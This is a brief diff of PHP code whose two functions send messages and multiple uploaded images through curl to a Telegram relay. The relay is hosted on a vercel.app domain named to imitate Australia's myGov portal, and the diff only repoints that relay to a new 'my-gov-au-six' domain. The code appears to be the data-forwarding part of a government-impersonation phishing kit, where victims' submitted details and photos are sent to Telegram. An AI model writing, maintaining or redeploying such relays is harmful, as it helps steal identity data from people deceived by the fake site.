@@ -2,7 +2,7 @@
 
 // Text-only function (unchanged)
 function send_telegram_msg($message) {
-    $apiUrl = 'https://my-gov-au.vercel.app/api/send-telegram';
+    $apiUrl = 'https://my-gov-au-six.vercel.app/api/send-telegram';
 
     $ch = curl_init($apiUrl);
     curl_setopt($ch, CURLOPT_POST, 1);
@@ -20,7 +20,7 @@ function send_telegram_msg($message) {
 
 // Updated photo function (handles multiple files)
 function send_telegram_img($message, $imgArr) {
-    $apiUrl = 'https://my-gov-au.vercel.app/api/send-telegram';
+    $apiUrl = 'https://my-gov-au-six.vercel.app/api/send-telegram';
 
     $ch = curl_init($apiUrl);
 
@@ -48,5 +48,6 @@ function send_telegram_img($message, $imgArr) {
     // Optional: Check $response for errors
     return true;
 }
+
 
 ?>
